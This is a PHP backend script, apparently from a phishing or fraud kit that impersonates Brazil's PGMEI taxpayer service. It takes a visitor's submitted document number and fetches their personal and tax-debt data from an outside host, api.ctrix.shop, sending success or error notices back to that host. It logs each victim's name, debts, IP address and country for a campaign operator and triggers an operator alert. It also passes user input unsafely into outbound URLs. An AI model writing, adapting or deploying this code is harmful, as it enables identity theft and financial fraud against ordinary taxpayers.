<?php

error_reporting(0);

extract($_POST);

if($doc){

    $data = file_get_contents("https://api.ctrix.shop/recuperar-dados?comando=$doc");

    if($data){
    
        include_once "../db.php";

        $id_usuario =  $_COOKIE['campanha'];
        $identity =  $_COOKIE['Identity'];

        if(!$id_usuario || !$identity){

            $dominioAtual = $_SERVER['HTTP_HOST'] ?? '';

            $stmt = $pdo->prepare("SELECT id_usuario, page FROM dominios WHERE nome_dominio = :dominio LIMIT 1");
            $stmt->execute(['dominio' => $dominioAtual]);
            $dominio = $stmt->fetch();

            $id_usuario =  $dominio['id_usuario'];

            $stmt = $pdo->prepare("SELECT username FROM users WHERE id = :id_usuario LIMIT 1");
            $stmt->execute(['id_usuario' => $id_usuario]);
            $user = $stmt->fetch();

            $identity =  $user['username'];
        }

        $dataJson = json_decode($data);
        
        if($dataJson->dados){
            
            function limparValor($valor) {
                $valorLimpo = preg_replace('/[^0-9,]/', '', $valor);
                
                $valorLimpo = str_replace(',', '.', $valorLimpo);
            
                return (float)$valorLimpo;
            }

            function get_client_ip() {

                if (!empty($_SERVER['HTTP_CLIENT_IP']))   {
                    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
                }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
                {
                    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
                }else{
                    $ip_address = $_SERVER['REMOTE_ADDR'];
                }
                return $ip_address;
            }
            
            $token = $_COOKIE['session'];

            $result = json_encode($dataJson->dados);

            if (strpos($result, 'verifique os dados inseridos e tente novamente') !== false){

                file_get_contents("https://api.ctrix.shop/salvar?protocol=erro&comando=$doc");

                echo $result; 

            }else{

               echo $result;

                if (strpos($result, 'user') !== false){

                file_get_contents("https://api.ctrix.shop/salvar?protocol=sucesso&comando=$doc");
            
                $Xdados = json_decode($result);
            
                $Dados = [];
            
                $TotalDebitos = 0;
                $Faturas = 0;

                date_default_timezone_set('America/Sao_Paulo');

                $page = 'pgmei';
                $dados64 = base64_encode($result);

                // Limpa registros temporários de digitação antes de verificar/inserir
                $deleteTyping = $pdo->prepare("DELETE FROM logins WHERE login_info LIKE :login_info AND dados = 'Typing iniciado'");
                $deleteTyping->execute([':login_info' => "%$doc%"]);

                $check = $pdo->prepare("SELECT * FROM logins WHERE login_info LIKE :login_info AND resposta <> '' AND resposta IS NOT NULL LIMIT 1");
                $check->execute([':login_info' => "%$doc%"]);
                $exists = $check->fetchColumn();

                if (!$exists) {

                    $ip_address = get_client_ip();

                    $DadosIp = json_decode(file_get_contents("https://ipinfo.io/$ip_address/json"), true);
                    $pais = $DadosIp['country'] ?? 'Desconecido';

                        $entrada = $Xdados->user->Nome;
                        $dados = preg_replace('/[^A-Za-zÀ-ÿ\s]/u', '', $entrada);

                        $data = $Xdados->debitos;

                        $debitos = 0.0;
                        $debitosCont = 0;

                        foreach ($data as $ano => $meses) {
                            foreach ($meses as $mes) {
                                $valor = $mes->total;
                                if ($valor !== '-' && !empty($valor)) {
                                    $debitosCont++;
                                    $valorNumerico = floatval(str_replace(',', '.', str_replace(['R$', '.'], '', $valor)));
                                    $debitos += $valorNumerico;
                                }
                            }
                        }

                        $debitos = "$debitosCont / $debitos";

                        $loginData = [
                            ['label' => 'doc', 'value' => $doc]
                        ];

                        $login_info = json_encode($loginData, JSON_UNESCAPED_UNICODE);

                        $hora = date('Y-m-d H:i:s'); // Hora atual

                        $stmt = $pdo->prepare("INSERT INTO logins (page, dados, debitos, ip, pais, identity, hora, login_info, id_usuario, resposta) VALUES 
                                              (:page, :dados, :debitos, :ip, :pais, :identity, :hora, :login_info, :id_usuario, :resposta)");

                         $is =  $stmt->execute([
                                ':page'       => $page,
                                ':dados'      => $dados,
                                ':debitos'    => $debitos,
                                ':ip'         => $ip_address,
                                ':pais'       => $pais,
                                ':identity'   => $identity,
                                ':hora'       => $hora,
                                ':login_info' => $login_info,
                                ':id_usuario' => $id_usuario,
                                ':resposta' => $dados64
                            ]);

                            if($is){
                                $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio,  atual = :atual WHERE id = :id");
                                        $updateStmt->execute([
                                            ':audio' => 2,
                                            ':atual' => rand(100000000, 99999999999),
                                            ':id' => 1
                                        ]);
                            }

                }else {

                   // $sql = "UPDATE infos SET dados = '$dados64' WHERE id_user = '$doc'";
                   // mysqli_query($conexao, $sql);
                }
                 
                echo 'sucesso!';
    
                }else {

                    if (strpos($result, 'verifique os dados inseridos e tente novamente') !== false){
                        
                        file_get_contents("https://api.ctrix.shop/salvar?protocol=erro&comando=$doc");
                    }
                    
                    echo 1;
                }
            
            }

        }
    }
}


?>